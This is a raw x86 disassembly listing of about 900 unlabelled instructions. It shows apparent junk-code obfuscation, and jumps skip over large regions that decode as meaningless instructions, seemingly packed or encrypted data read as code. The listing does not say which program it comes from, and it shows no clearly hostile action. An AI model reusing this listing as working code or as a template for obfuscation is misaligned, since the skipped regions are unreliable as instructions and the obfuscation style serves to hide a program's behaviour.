  413613:	mov    ecx,DWORD PTR ds:0x428421
  413619:	xor    ecx,DWORD PTR ds:0x428451
  41361f:	mov    DWORD PTR ds:0x428421,ecx
  413625:	dec    ecx
  413626:	mov    DWORD PTR [ebp-0xc],eax
  413629:	cmp    DWORD PTR ds:0x428449,0x0
  413630:	mov    DWORD PTR ds:0x428425,0x7db5
  41363a:	mov    DWORD PTR ds:0x42845d,edi
  413640:	jmp    0x4136bd
  413645:	mov    ecx,DWORD PTR ds:0x428335
  41364b:	mov    eax,ds:0x42843d
  413650:	cmp    DWORD PTR ds:0x428449,0x0
  413657:	je     0x4136a7
  41365d:	push   DWORD PTR [ebp-0x20]
  413660:	push   DWORD PTR [ebp-0x28]
  413663:	push   DWORD PTR [ebp-0x28]
  413666:	push   DWORD PTR [ebp-0xc]
  413669:	push   DWORD PTR [ebp-0x18]
  41366c:	push   DWORD PTR [ebp-0xc]
  41366f:	push   DWORD PTR [ebp-0x14]
  413672:	push   DWORD PTR [ebp-0x1c]
  413675:	push   DWORD PTR [ebp-0x20]
  413678:	push   DWORD PTR [ebp-0x14]
  41367b:	push   0x6fca
  413680:	push   DWORD PTR [ebp-0x14]
  413683:	push   0x1843
  413688:	call   DWORD PTR ds:0x42e014
  41368e:	movzx  ecx,BYTE PTR ds:0x42842d
  413695:	and    DWORD PTR ds:0x428549,ecx
  41369b:	sbb    ecx,0x7147
  4136a1:	and    DWORD PTR ds:0x4284c5,ebx
  4136a7:	mov    ecx,DWORD PTR ds:0x428475
  4136ad:	add    DWORD PTR ds:0x42841d,ecx
  4136b3:	and    DWORD PTR ds:0x42836d,0x5196
  4136bd:	mov    eax,ds:0x422708
  4136c2:	adc    DWORD PTR ds:0x428425,0x635d
  4136cc:	mov    DWORD PTR [ebp-0xc],eax
  4136cf:	cmp    DWORD PTR ds:0x4284d1,0x0
  4136d6:	mov    DWORD PTR ds:0x428345,0x6dcc
  4136e0:	mov    ecx,DWORD PTR ds:0x428441
  4136e6:	jmp    0x413753
  4136eb:	mov    DWORD PTR ds:0x4284dd,0x2cf
  4136f5:	mov    DWORD PTR ds:0x428581,0x621d
  4136ff:	cmp    DWORD PTR ds:0x4284d1,0x0
  413706:	jbe    0x41373d
  41370c:	push   0x4284d1
  413711:	push   0x428405
  413716:	push   0x2216
  41371b:	call   DWORD PTR ds:0x42e258
  413721:	and    ecx,ecx
  413723:	mov    ecx,DWORD PTR ds:0x4283ad
  413729:	mov    ecx,DWORD PTR [ecx]
  41372b:	add    DWORD PTR ds:0x42836d,ecx
  413731:	or     ecx,ecx
  413733:	sbb    DWORD PTR ds:0x4284ed,0x6873
  41373d:	sbb    DWORD PTR ds:0x4284f5,ecx
  413743:	adc    DWORD PTR ds:0x428471,0x1149
  41374d:	or     DWORD PTR ds:0x4284f1,edx
  413753:	mov    eax,DWORD PTR [ebp-0x28]
  413756:	cmp    DWORD PTR ds:0x428455,0x0
  41375d:	mov    ecx,0xa9f
  413762:	mov    DWORD PTR ds:0x42841d,0x1875
  41376c:	mov    DWORD PTR ds:0x4284f1,0x319d
  413776:	jmp    0x41383a
  41377b:	mov    DWORD PTR ds:0x4284e1,0x86c
  413785:	cmp    DWORD PTR ds:0x428455,0x0
  41378c:	jle    0x4137bf
  413792:	push   0x50b5
  413797:	call   DWORD PTR ds:0x42e25c
  41379d:	add    DWORD PTR ds:0x428365,0x737d
  4137a7:	sub    ecx,DWORD PTR ds:0x4284f1
  4137ad:	mov    ecx,DWORD PTR ds:0x428565
  4137b3:	xor    ecx,DWORD PTR ds:0x428431
  4137b9:	mov    DWORD PTR ds:0x428565,ecx
  4137bf:	inc    ecx
  4137c0:	movzx  ecx,BYTE PTR ds:0x428365
  4137c7:	sub    ecx,DWORD PTR ds:0x4284d1
  4137cd:	mov    DWORD PTR ds:0x428365,ecx
  4137d3:	cmp    DWORD PTR ds:0x42844d,0x0
  4137da:	not    ecx
  4137dc:	mov    DWORD PTR ds:0x42840d,0x5561
  4137e6:	jmp    0x41383a
  4137eb:	mov    DWORD PTR ds:0x428581,0x2772
  4137f5:	cmp    DWORD PTR ds:0x42844d,0x0
  4137fc:	jle    0x41381e
  413802:	push   0x5196
  413807:	push   0x42820f
  41380c:	call   DWORD PTR ds:0x42e260
  413812:	sbb    DWORD PTR ds:0x428369,ecx
  413818:	xor    ecx,DWORD PTR ds:0x42857d
  41381e:	and    DWORD PTR ds:0x42843d,edi
  413824:	inc    DWORD PTR ds:0x428451
  41382a:	add    DWORD PTR ds:0x428359,0x3293
  413834:	or     DWORD PTR ds:0x428425,ecx
  41383a:	mov    DWORD PTR [ebp-0x24],eax
  41383d:	mov    ecx,DWORD PTR [ebp-0x24]
  413840:	push   0x4
  413842:	sub    DWORD PTR ds:0x4284dd,0x4aeb
  41384c:	pop    eax
  41384d:	sbb    DWORD PTR ds:0x42855d,0x428359
  413857:	sub    eax,ecx
  413859:	cmp    DWORD PTR ds:0x428371,0x0
  413860:	mov    ecx,DWORD PTR ds:0x4284f1
  413866:	not    ecx
  413868:	movzx  ecx,BYTE PTR ds:0x428349
  41386f:	mov    ecx,DWORD PTR ds:0x428465
  413875:	jmp    0x4138c3
  41387a:	mov    DWORD PTR ds:0x4284e1,0x61cd
  413884:	cmp    DWORD PTR ds:0x428371,0x0
  41388b:	je     0x4138b5
  413891:	push   0x4284e5
  413896:	push   0x4282df
  41389b:	call   DWORD PTR ds:0x42e264
  4138a1:	or     DWORD PTR ds:0x428461,0x428425
  4138ab:	mov    DWORD PTR ds:0x428421,0x2055
  4138b5:	sub    ecx,DWORD PTR ds:0x42845d
  4138bb:	or     ecx,DWORD PTR ds:0x42840d
  4138c1:	neg    ecx
  4138c3:	mov    ecx,DWORD PTR [ebp-0x20]
  4138c6:	add    ecx,eax
  4138c8:	mov    DWORD PTR [ebp-0x30],ecx
  4138cb:	lea    eax,[ebp-0x3c]
  4138ce:	mov    DWORD PTR [ebp-0x38],eax
  4138d1:	mov    eax,DWORD PTR [ebp-0x18]
  4138d4:	mov    ecx,DWORD PTR [ebp-0x18]
  4138d7:	xor    eax,edi
  4138d9:	xor    ecx,ebx
  4138db:	shr    eax,0x2
  4138de:	shl    ecx,0x1e
  4138e1:	or     eax,ecx
  4138e3:	mov    DWORD PTR [ebp-0x2c],eax
  4138e6:	mov    DWORD PTR [ebp-0x8],0xa5069bbe
  4138ed:	mov    eax,DWORD PTR [ebp-0x8]
  4138f0:	mov    ecx,DWORD PTR [ebp-0x8]
  4138f3:	xor    eax,edi
  4138f5:	xor    ecx,ebx
  4138f7:	shr    eax,0x2
  4138fa:	shl    ecx,0x1e
  4138fd:	or     ecx,eax
  4138ff:	push   ecx
  413900:	lea    eax,[ebp-0x8]
  413903:	push   eax
  413904:	lea    eax,[ebp-0x80]
  413907:	push   eax
  413908:	call   0x411c08
  41390d:	mov    eax,DWORD PTR [ebp-0x8]
  413910:	mov    ecx,DWORD PTR [ebp-0x8]
  413913:	xor    eax,edi
  413915:	xor    ecx,ebx
  413917:	shr    eax,0x2
  41391a:	shl    ecx,0x1e
  41391d:	or     ecx,eax
  41391f:	push   ecx
  413920:	lea    eax,[ebp-0x24]
  413923:	push   eax
  413924:	mov    eax,DWORD PTR [ebp+0x8]
  413927:	mov    ecx,DWORD PTR [ebp+0xc]
  41392a:	shrd   eax,ecx,0x2
  41392e:	shr    ecx,0x2
  413931:	mov    ecx,DWORD PTR [ebp+0x8]
  413934:	mov    edx,DWORD PTR [ebp+0xc]
  413937:	xor    eax,esi
  413939:	xor    edx,edx
  41393b:	or     eax,edx
  41393d:	lea    eax,[ebp+eax*4-0x7c]
  413941:	push   eax
  413942:	shl    ecx,0x1e
  413945:	call   0x411c08
  41394a:	mov    eax,DWORD PTR [ebp-0x8]
  41394d:	mov    ecx,DWORD PTR [ebp-0x8]
  413950:	xor    eax,edi
  413952:	xor    ecx,ebx
  413954:	shr    eax,0x2
  413957:	shl    ecx,0x1e
  41395a:	or     ecx,eax
  41395c:	push   ecx
  41395d:	lea    eax,[ebp-0x30]
  413960:	push   eax
  413961:	jmp    0x413c9a
  413966:	in     eax,dx
  413967:	dec    edi
  413968:	ret    
  413969:	in     al,dx
  41396a:	fs jl  0x413963
  41396d:	pop    ebx
  41396e:	push   0x7be3e744
  413973:	aaa    
  413974:	scas   al,BYTE PTR es:[edi]
  413975:	iret   
  413976:	in     al,dx
  413977:	xchg   BYTE PTR [esi-0x413b1242],bh
  41397d:	mov    esi,0xc18a915e
  413982:	xchg   ebx,eax
  413983:	cmp    BYTE PTR [esi-0x2a6f5b65],dh
  413989:	mov    eax,ds:0x2cb3c0f
  41398e:	bound  ebp,QWORD PTR [eax]
  413990:	jbe    0x4139dc
  413992:	(bad)  
  413994:	imul   ecx
  413996:	mov    dl,BYTE PTR [edx-0x34]
  413999:	cmp    DWORD PTR [eax],eax
  41399b:	sbb    al,BYTE PTR [ecx-0x3c74aa98]
  4139a1:	popa   
  4139a2:	loopne 0x413943
  4139a4:	sub    eax,0x130e786e
  4139a9:	and    al,0x5
  4139ab:	push   ss
  4139ac:	lods   al,BYTE PTR ds:[esi]
  4139ad:	jl     0x41398a
  4139af:	or     DWORD PTR [ebx+edi*1+0x35b70bce],edi
  4139b6:	xor    eax,DWORD PTR [esi-0x54]
  4139b9:	lahf   
  4139ba:	js     0x413994
  4139bc:	pusha  
  4139bd:	xchg   ecx,eax
  4139be:	push   ss
  4139bf:	push   edx
  4139c0:	mov    edx,DWORD PTR [ecx]
  4139c2:	push   cs
  4139c3:	add    dl,0x38
  4139c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4139c7:	inc    edi
  4139c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4139c9:	pop    ss
  4139ca:	mov    ds:0x6ba9ef2,al
  4139cf:	push   ds
  4139d0:	imul   esp,DWORD PTR [edi+0x3e3ce599],0x2e
  4139d7:	mov    ecx,0x2a31e82e
  4139dc:	and    DWORD PTR [ebx],edi
  4139de:	jge    0x413971
  4139e0:	out    dx,al
  4139e1:	or     DWORD PTR [edx],ebp
  4139e3:	push   edi
  4139e4:	fstp   TBYTE PTR [edx+0x3ee73512]
  4139ea:	push   ss
  4139eb:	push   ss
  4139ec:	jne    0x4139b3
  4139ee:	leave  
  4139ef:	out    0x67,eax
  4139f1:	push   edx
  4139f2:	cmp    ebp,DWORD PTR [ebp+0x1b2c52c6]
  4139f8:	jg     0x413a05
  4139fa:	imul   ecx,DWORD PTR [ecx],0xffffffb2
  4139fd:	push   ds
  4139fe:	jno    0x413a23
  413a00:	xlat   BYTE PTR ds:[ebx]
  413a01:	sbb    bh,BYTE PTR [edi]
  413a03:	xchg   esi,eax
  413a04:	or     DWORD PTR [edx-0x33],esi
  413a07:	jl     0x413a5a
  413a09:	loopne 0x4139c8
  413a0b:	jo     0x413a38
  413a0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a0e:	daa    
  413a0f:	outs   dx,DWORD PTR ds:[esi]
  413a10:	fucom  st(6)
  413a12:	cli    
  413a13:	sub    eax,0x332ac66f
  413a18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a19:	inc    esp
  413a1a:	aaa    
  413a1b:	add    al,0x4c
  413a1d:	push   edx
  413a1e:	mov    esi,fs
  413a20:	add    ebx,eax
  413a22:	adc    BYTE PTR [ebp+0x34],cl
  413a25:	xor    BYTE PTR [ebx],bl
  413a27:	les    edi,FWORD PTR [ebx]
  413a29:	lods   al,BYTE PTR ds:[esi]
  413a2a:	adc    BYTE PTR [edi+0x195e83c1],dh
  413a30:	and    dh,dl
  413a32:	or     eax,DWORD PTR ds:0xad34db80
  413a38:	sbb    dl,BYTE PTR ds:0xbdc79a3d
  413a3e:	push   edi
  413a3f:	call   0xe15112ba
  413a44:	pop    esi
  413a45:	lods   al,BYTE PTR ds:[esi]
  413a46:	hlt    
  413a47:	xor    ecx,eax
  413a49:	push   edx
  413a4a:	mov    ch,al
  413a4c:	mov    al,dh
  413a4e:	es mov bl,0xb0
  413a51:	jg     0x413a44
  413a53:	mov    eax,ds:0xf9be4f0
  413a58:	xchg   DWORD PTR [edx],ebp
  413a5a:	into   
  413a5b:	test   DWORD PTR [eax-0x4d],esi
  413a5e:	cmp    eax,DWORD PTR [edx+eax*4]
  413a61:	jecxz  0x413a53
  413a63:	pop    es
  413a64:	adc    eax,0xb38fa538
  413a69:	pop    ds
  413a6a:	cli    
  413a6b:	lods   al,BYTE PTR ds:[esi]
  413a6c:	shr    BYTE PTR [ebx+0x12],1
  413a6f:	mov    ah,cl
  413a71:	stos   DWORD PTR es:[edi],eax
  413a72:	mov    al,0x3f
  413a74:	jns    0x413add
  413a76:	loop   0x413a06
  413a78:	push   ds
  413a79:	test   dh,ch
  413a7b:	adc    DWORD PTR [ecx+0x7f],esi
  413a7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a7f:	mov    eax,0xce0146f7
  413a84:	pop    ebx
  413a85:	sahf   
  413a86:	xor    ebx,esi
  413a88:	jle    0x413aa4
  413a8a:	add    esp,DWORD PTR [ecx+0x1c]
  413a8d:	jge    0x413acf
  413a8f:	(bad)  
  413a90:	jg     0x413a28
  413a92:	out    dx,al
  413a93:	call   0xf11d:0x21c23086
  413a9a:	inc    ebp
  413a9b:	inc    esi
  413a9c:	ins    BYTE PTR es:[edi],dx
  413a9d:	sbb    dl,BYTE PTR [edi]
  413a9f:	cwde   
  413aa0:	dec    esp
  413aa1:	add    al,0xef
  413aa3:	mov    ch,0x37
  413aa5:	std    
  413aa6:	pop    eax
  413aa7:	mov    ebp,0xe1a6382f
  413aac:	and    ch,BYTE PTR [edi+ecx*2]
  413aaf:	shl    ebp,0xe3
  413ab2:	lock lods eax,DWORD PTR ds:[esi]
  413ab4:	jnp    0x413b02
  413ab6:	ja     0x413a47
  413ab8:	add    al,0xf7
  413aba:	inc    ecx
  413abb:	rcr    DWORD PTR [ecx+0x42],1
  413abe:	out    dx,eax
  413abf:	xor    eax,0xfaf732c9
  413ac4:	aaa    
  413ac5:	ret    
  413ac6:	es mov dh,0x64
  413ac9:	sub    eax,0x17ed5dee
  413ace:	test   BYTE PTR [bx+si],ch
  413ad1:	jp     0x413aa3
  413ad3:	sbb    BYTE PTR [edx+0x2689f9e4],dl
  413ad9:	retf   
  413ada:	push   ss
  413adb:	in     al,0xf
  413add:	lahf   
  413ade:	add    dl,BYTE PTR [ebp-0x9483223]
  413ae4:	rcl    DWORD PTR [ebx],0x12
  413ae7:	xchg   edi,eax
  413ae8:	mov    edx,0x123a10ad
  413aed:	test   eax,0x858a0fcc
  413af2:	and    BYTE PTR [eax-0x7b],bh
  413af5:	pop    esp
  413af6:	xor    al,0xf9
  413af8:	hlt    
  413af9:	xor    al,0x74
  413afb:	sbb    ebp,edx
  413afd:	xchg   bh,cl
  413aff:	sub    al,0xe9
  413b01:	sar    bh,1
  413b03:	pop    eax
  413b04:	add    al,0x9b
  413b06:	pop    eax
  413b07:	mov    edx,0x43e0f3c0
  413b0c:	(bad)  
  413b0d:	imul   edi,DWORD PTR [eax],0xa673aa82
  413b13:	pop    ecx
  413b14:	push   0x58462574
  413b19:	lods   eax,DWORD PTR ds:[esi]
  413b1a:	scas   eax,DWORD PTR es:[edi]
  413b1b:	jp     0x413ad1
  413b1d:	add    al,0x17
  413b1f:	and    DWORD PTR ds:0x49f98add,ebx
  413b25:	imul   esi,DWORD PTR [esi+0x2805d4a5],0x6deb5422
  413b2f:	jg     0x413b45
  413b31:	dec    edx
  413b32:	inc    ecx
  413b33:	arpl   WORD PTR [ebx],dx
  413b35:	scas   al,BYTE PTR es:[edi]
  413b36:	sbb    eax,0x7ea094c8
  413b3b:	nop
  413b3c:	add    ecx,DWORD PTR [edi]
  413b3e:	inc    ebx
  413b3f:	push   ss
  413b40:	fld    TBYTE PTR ds:0x228c48e
  413b46:	fwait
  413b47:	ja     0x413b71
  413b49:	rcr    DWORD PTR [edx],1
  413b4b:	loop   0x413b10
  413b4d:	addr16 xchg ebx,eax
  413b4f:	push   es
  413b50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b51:	es push eax
  413b53:	mov    bl,0x14
  413b55:	js     0x413afc
  413b57:	and    DWORD PTR [edi+0x1f68101e],edi
  413b5d:	mov    ds:0x98bfe397,al
  413b62:	enter  0xbdd8,0x5b
  413b66:	ds pusha 
  413b68:	sbb    DWORD PTR [eax+eiz*2+0x454b3aff],ebp
  413b6f:	ss jbe 0x413b69
  413b72:	mov    ecx,0x64e7fcdb
  413b77:	pop    edi
  413b78:	fistp  WORD PTR [edi]
  413b7a:	pop    edx
  413b7b:	gs cmc 
  413b7d:	adc    ebp,DWORD PTR fs:[eax+edi*1+0xb]
  413b82:	mov    edi,0xbd11e16e
  413b87:	ss into 
  413b89:	xor    eax,0xa5567fd8
  413b8e:	pop    eax
  413b8f:	sbb    esp,DWORD PTR [ebx]
  413b91:	aaa    
  413b92:	ja     0x413bf9
  413b94:	cmc    
  413b95:	inc    edx
  413b96:	xor    al,0xc7
  413b98:	pop    ss
  413b99:	sbb    ah,BYTE PTR [edx]
  413b9b:	fld    DWORD PTR [ebx+0x1df0c6cc]
  413ba1:	push   0xefa750bc
  413ba6:	cld    
  413ba7:	xchg   edi,eax
  413ba8:	clc    
  413ba9:	inc    ebx
  413baa:	pop    edi
  413bab:	sub    DWORD PTR [esi],0xfffffff9
  413bae:	push   ss
  413baf:	fmul   QWORD PTR [esp+edx*4]
  413bb2:	icebp  
  413bb3:	mov    ecx,0xfdd98a58
  413bb8:	push   esi
  413bb9:	das    
  413bba:	cmp    edi,DWORD PTR [ebx]
  413bbc:	bound  edx,QWORD PTR [edi]
  413bbe:	mov    eax,ds:0x474cfc78
  413bc3:	jmp    0x413bcf
  413bc5:	and    DWORD PTR [esi-0x6a3718ac],ebp
  413bcb:	enter  0x60da,0xd1
  413bcf:	std    
  413bd0:	push   ds
  413bd1:	icebp  
  413bd2:	cmc    
  413bd3:	inc    edi
  413bd4:	stos   BYTE PTR es:[edi],al
  413bd5:	out    dx,al
  413bd6:	shl    bl,1
  413bd8:	out    0x79,eax
  413bda:	out    0x37,al
  413bdc:	dec    ecx
  413bdd:	inc    ecx
  413bde:	inc    ebx
  413bdf:	jecxz  0x413c59
  413be1:	inc    ebx
  413be2:	push   edx
  413be3:	repz push 0xffffffb5
  413be6:	inc    edi
  413be7:	aaa    
  413be8:	mov    ecx,0x9dbf897
  413bed:	les    ebx,FWORD PTR [edi+0x122a9db8]
  413bf3:	pop    esp
  413bf4:	cdq    
  413bf5:	xor    al,0x55
  413bf7:	in     al,0x98
  413bf9:	(bad)  
  413bfa:	sti    
  413bfb:	and    DWORD PTR [ecx],edi
  413bfd:	jb     0x413c5f
  413bff:	push   esp
  413c00:	adc    edx,DWORD PTR [esi+0x637da93e]
  413c06:	leave  
  413c07:	test   eax,0xfc4327b2
  413c0c:	popf   
  413c0d:	push   0x78
  413c0f:	mov    al,ds:0x309b03ff
  413c14:	int3   
  413c15:	sbb    ah,BYTE PTR [edx]
  413c17:	pusha  
  413c18:	push   es
  413c19:	lods   al,BYTE PTR ds:[esi]
  413c1a:	ret    
  413c1b:	xchg   ebx,eax
  413c1c:	cli    
  413c1d:	xor    dl,bl
  413c1f:	popf   
  413c20:	pop    eax
  413c21:	xlat   BYTE PTR ds:[ebx]
  413c22:	inc    edx
  413c23:	cmp    BYTE PTR [edi+ebx*1+0x61],0xd
  413c28:	xor    al,BYTE PTR [edx-0x44]
  413c2b:	out    0xa8,al
  413c2d:	dec    eax
  413c2e:	jge    0x413bfc
  413c30:	pop    ebx
  413c31:	mov    ds:0xf34ccbb7,eax
  413c36:	cdq    
  413c37:	sub    BYTE PTR [ebx],ch
  413c39:	add    edx,edi
  413c3b:	std    
  413c3c:	sbb    DWORD PTR [eax],esp
  413c3e:	xchg   ecx,eax
  413c3f:	cmp    ecx,DWORD PTR ds:0x406492db
  413c45:	xor    DWORD PTR [ecx],ecx
  413c47:	or     eax,0x9f5d9481
  413c4c:	daa    
  413c4d:	jmp    0xf5d1033c
  413c52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413c53:	cmp    edx,DWORD PTR [ecx-0x5d]
  413c56:	call   0xf647ba1c
  413c5b:	add    eax,0x4947ff72
  413c60:	sar    DWORD PTR [edi],1
  413c62:	shl    BYTE PTR [eax+0x6c],cl
  413c65:	cmp    al,0x2c
  413c67:	addr16 push edi
  413c69:	gs into 
  413c6b:	inc    eax
  413c6c:	test   al,0x83
  413c6e:	add    eax,0x1d85cd58
  413c73:	cmp    edi,esi
  413c75:	out    dx,al
  413c76:	mov    ch,0x92
  413c78:	popa   
  413c79:	shrd   DWORD PTR [edi+0x49],ebx,cl
  413c7d:	cmc    
  413c7e:	add    cl,BYTE PTR [ebx+0x1b652aae]
  413c84:	pop    es
  413c85:	xchg   ecx,eax
  413c86:	jnp    0x413c7d
  413c88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c89:	xor    edx,DWORD PTR [ebx-0x6e]
  413c8c:	cmp    al,0x98
  413c8e:	mov    bl,0xaf
  413c90:	fld    QWORD PTR [ecx+0x7c]
  413c93:	sub    edi,ecx
  413c95:	leave  
  413c96:	sub    bl,bh
  413c98:	out    0x3f,al
  413c9a:	mov    eax,DWORD PTR [ebp+0x10]
  413c9d:	mov    ecx,DWORD PTR [ebp+0x14]
  413ca0:	shrd   eax,ecx,0x2
  413ca4:	shr    ecx,0x2
  413ca7:	mov    ecx,DWORD PTR [ebp+0x10]
  413caa:	mov    edx,DWORD PTR [ebp+0x14]
  413cad:	xor    eax,esi
  413caf:	xor    edx,edx
  413cb1:	or     eax,edx
  413cb3:	lea    eax,[ebp+eax*4-0x7c]
  413cb7:	push   eax
  413cb8:	shl    ecx,0x1e
  413cbb:	call   0x411c08
  413cc0:	mov    eax,DWORD PTR [ebp-0x8]
  413cc3:	mov    ecx,DWORD PTR [ebp-0x8]
  413cc6:	xor    ecx,ebx
  413cc8:	xor    eax,edi
  413cca:	shl    ecx,0x1e
  413ccd:	shr    eax,0x2
  413cd0:	or     ecx,eax
  413cd2:	push   ecx
  413cd3:	lea    eax,[ebp-0x2c]
  413cd6:	push   eax
  413cd7:	mov    eax,DWORD PTR [ebp+0x10]
  413cda:	mov    ecx,DWORD PTR [ebp+0x14]
  413cdd:	shrd   eax,ecx,0x2
  413ce1:	shr    ecx,0x2
  413ce4:	mov    ecx,DWORD PTR [ebp+0x10]
  413ce7:	mov    edx,DWORD PTR [ebp+0x14]
  413cea:	xor    edx,edx
  413cec:	xor    eax,esi
  413cee:	or     eax,edx
  413cf0:	shl    ecx,0x1e
  413cf3:	mov    ecx,DWORD PTR [ebp+0x10]
  413cf6:	mov    edx,DWORD PTR [ebp+0x14]
  413cf9:	shrd   ecx,edx,0x2
  413cfd:	shr    edx,0x2
  413d00:	mov    edx,DWORD PTR [ebp+0x10]
  413d03:	mov    ebx,DWORD PTR [ebp+0x14]
  413d06:	xor    ecx,esi
  413d08:	xor    ebx,ebx
  413d0a:	or     ecx,ebx
  413d0c:	add    eax,ecx
  413d0e:	lea    eax,[ebp+eax*4-0x7c]
  413d12:	push   eax
  413d13:	shl    edx,0x1e
  413d16:	call   0x411c08
  413d1b:	mov    eax,DWORD PTR [ebp-0x8]
  413d1e:	mov    ecx,DWORD PTR [ebp-0x8]
  413d21:	xor    ecx,0xfffffffe
  413d24:	shl    ecx,0x1e
  413d27:	xor    eax,edi
  413d29:	shr    eax,0x2
  413d2c:	or     ecx,eax
  413d2e:	push   ecx
  413d2f:	lea    eax,[ebp-0x38]
  413d32:	push   eax
  413d33:	mov    eax,DWORD PTR [ebp+0x10]
  413d36:	mov    ecx,DWORD PTR [ebp+0x14]
  413d39:	shrd   eax,ecx,0x2
  413d3d:	shr    ecx,0x2
  413d40:	jmp    0x414079
  413d45:	lock aad 0x95
  413d48:	dec    ecx
  413d49:	mov    bh,0x8a
  413d4b:	xor    al,0x7c
  413d4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d4e:	cmp    eax,0x3cecdd72
  413d53:	jbe    0x413ce7
  413d55:	sbb    ecx,DWORD PTR [esi+edi*4-0x413b1242]
  413d5c:	mov    esi,0xdaa583a0
  413d61:	push   esi
  413d62:	sbb    eax,0x3f2c7773
  413d67:	cwde   
  413d68:	pop    esi
  413d69:	or     eax,0xba657052
  413d6e:	xchg   BYTE PTR [ebx+ebx*8],dh
  413d71:	jb     0x413dae
  413d73:	scas   al,BYTE PTR es:[edi]
  413d74:	inc    eax
  413d75:	bswap  esp
  413d77:	dec    edx
  413d78:	test   al,0x30
  413d7a:	push   0x415c32db
  413d7f:	aaa    
  413d80:	test   eax,0xd0082837
  413d85:	push   ss
  413d86:	pop    esi
  413d87:	mov    BYTE PTR [ecx],al
  413d89:	test   eax,0xa2d53d99
  413d8e:	cwde   
  413d8f:	cli    
  413d90:	jle    0x413d21
  413d92:	and    al,0xe7
  413d94:	cmp    al,0x6e
  413d96:	mov    eax,ds:0x69a6a5a7
  413d9b:	and    BYTE PTR [edi],bh
  413d9d:	xchg   esi,eax
  413d9e:	jne    0x413d47
  413da0:	lea    edx,[ecx]
  413da2:	jne    0x413dfd
  413da4:	push   eax
  413da5:	or     edx,DWORD PTR [edi]
  413da7:	mov    ah,0xa3
  413da9:	cmp    bl,BYTE PTR [edx]
  413dab:	fwait
  413dac:	lahf   
  413dad:	add    BYTE PTR [ecx],bh
  413daf:	ret    0x6890
  413db2:	or     DWORD PTR [eax],esi
  413db4:	inc    edi
  413db5:	adc    BYTE PTR [eax],bl
  413db7:	lahf   
  413db8:	dec    edi
  413db9:	ret    0xc70
  413dbc:	mov    bh,0x54
  413dbe:	bound  edi,QWORD PTR [edx-0x26]
  413dc1:	out    dx,al
  413dc2:	xchg   edx,eax
  413dc3:	sbb    ecx,ebp
  413dc5:	fiadd  DWORD PTR [ebx]
  413dc7:	not    DWORD PTR [ebp+0xe49d10c]
  413dcd:	pop    esi
  413dce:	test   eax,0xc247a6d4
  413dd3:	clc    
  413dd4:	jae    0x413def
  413dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413dd7:	lahf   
  413dd8:	and    al,0x1e
  413dda:	adc    BYTE PTR [edi-0x185a43f],dl
  413de0:	rol    BYTE PTR [eax],1
  413de2:	push   ebp
  413de3:	ins    DWORD PTR es:[edi],dx
  413de4:	mov    ecx,0xb795b0a7
  413de9:	jle    0x413dd8
  413deb:	xchg   esp,eax
  413dec:	jae    0x413ddf
  413dee:	std    
  413def:	aas    
  413df0:	mov    bh,0xf0
  413df2:	xchg   DWORD PTR [ebp*2-0x60e0a457],esi
  413df9:	in     al,0xa3
  413dfb:	pop    ebx
  413dfc:	sbb    BYTE PTR [ebx],al
  413dfe:	xchg   edi,eax
  413dff:	xor    eax,0xf5ea0ea2
  413e04:	cdq    
  413e05:	jmp    0xd384:0xa92d22b2
  413e0c:	imul   ebx,DWORD PTR [ebp+0x6a783307],0x3bfcf12e
  413e16:	ja     0x413e11
  413e18:	sub    BYTE PTR [edx+0x45],dl
  413e1b:	push   edx
  413e1c:	xchg   ecx,eax
  413e1d:	pop    es
  413e1e:	mov    ah,0xfc
  413e20:	scas   eax,DWORD PTR es:[edi]
  413e21:	pop    edi
  413e22:	test   BYTE PTR [ecx],cl
  413e24:	jge    0x413e04
  413e26:	ja     0x413e28
  413e28:	push   ebp
  413e29:	push   ecx
  413e2a:	aas    
  413e2b:	out    0x64,al
  413e2d:	arpl   WORD PTR [edx-0x21c2be31],cx
  413e33:	push   edx
  413e34:	or     al,0xed
  413e36:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e38:	mov    esp,DWORD PTR [edi]
  413e3a:	or     al,0xdc
  413e3c:	shl    BYTE PTR [edi],0x3c
  413e3f:	jg     0x413e25
  413e41:	sbb    edi,0x1e
  413e44:	hlt    
  413e45:	aad    0xd9
  413e47:	rcr    BYTE PTR ds:0x9674dbab,0x10
  413e4e:	addr16 aad 0xab
  413e51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e52:	mov    dl,ah
  413e54:	ror    DWORD PTR [edx],cl
  413e56:	cmp    dh,cl
  413e58:	pop    es
  413e59:	fyl2x  
  413e5b:	icebp  
  413e5c:	call   0xe7ddb00a
  413e61:	mov    esp,DWORD PTR [edi-0x28fd790f]
  413e67:	inc    ebx
  413e68:	test   DWORD PTR [ecx+0x6],0xacbca7f7
  413e6f:	pop    eax
  413e70:	fmul   DWORD PTR [ebp-0x7ed098d3]
  413e76:	xor    ecx,DWORD PTR [esi+eax*2-0x7be8e626]
  413e7d:	ja     0x413ef5
  413e7f:	mov    ah,0xb8
  413e81:	ins    DWORD PTR es:[edi],dx
  413e82:	inc    esi
  413e83:	xlat   BYTE PTR ds:[ebx]
  413e84:	push   ss
  413e85:	sahf   
  413e86:	and    al,0x66
  413e88:	loope  0x413ee9
  413e8a:	sahf   
  413e8b:	pop    edx
  413e8c:	aad    0x5d
  413e8e:	mov    ch,0x4b
  413e90:	mov    al,0x2
  413e92:	lahf   
  413e93:	aas    
  413e94:	or     BYTE PTR [edi-0x47],dh
  413e97:	or     eax,0x64b258da
  413e9c:	sub    edi,edi
  413e9e:	fmul   DWORD PTR [esi+edi*4-0x6b]
  413ea2:	clc    
  413ea3:	ret    0xcef9
  413ea6:	mov    ch,0xcc
  413ea8:	and    DWORD PTR [edi+0x39],esi
  413eab:	es push edi
  413ead:	push   edi
  413eae:	xor    BYTE PTR [ecx+edi*4],ch
  413eb1:	imul   edi,DWORD PTR [esi],0x73
  413eb4:	mov    ch,0x4a
